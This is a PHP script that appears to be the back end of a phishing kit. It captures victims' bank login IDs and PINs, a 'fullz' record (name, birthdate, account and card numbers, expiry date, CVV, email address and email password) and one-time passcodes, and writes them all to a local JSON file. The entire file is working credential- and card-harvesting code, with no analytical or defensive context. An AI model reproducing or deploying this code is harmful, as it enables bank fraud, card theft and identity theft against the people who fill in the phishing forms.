<?php
	function push(&$a,$b){
		foreach ($b as $key => $value) {
			$a[$key] = $value;
		}
	}
	$update_flag = false;
	$out_dir = "./zult/access.json";
	$uid = md5($_SESSION['userid'] . $_SESSION['password']);
	$results = json_decode(file_get_contents($out_dir), true);
	if(!isset($results[$uid])){
		$results[$uid] = array();
	}
	if(isset($_POST['channelUserID'],$_POST['channelUserID'])){
		push($results[$uid],array('userid' => $_POST['channelUserID'] , 'password' => $_POST['channelPswdPin'] , 'time' => time() ));
		$update_flag = true;
 	}else if(isset($_POST['fullz'])){
 		$p = $_POST;
 		$fullz = array(
 			'[Form]Firstname' => $p['fname'],
 			'[Form]Middleinitial' => $p['mname'],
 			'[Form]Lastname' => $p['lname'],
 			'[Form]Number' => $p['cnumber'],
 			'[Form]Birtdate' => $p['bday'],
 			'[Form]AccountNumber' => $p['accnum'],
 			'[Form]CardNumber' => $p['cc'],
 			'[Form]ExpirationDate' => $p['exp'],
 			'[Form]SecurityCode' => $p['cvv'],
 			'[Form]Email' => $p['email'],
 			'[Form]EmailPassword' => $p['email_pass'],

 		);
 		push($results[$uid],$fullz);
 		$update_flag = true;
	}
	else if(isset($_POST['OTP'])){
		push($results[$uid],array('OTP' => $_POST['OTP']));
		$update_flag = true;
	}
	if($update_flag){
		$results['segment'] = mt_rand();
	}
	$fh = fopen($out_dir,"w");
	fwrite($fh, json_encode($results));
	fclose($fh);
?>
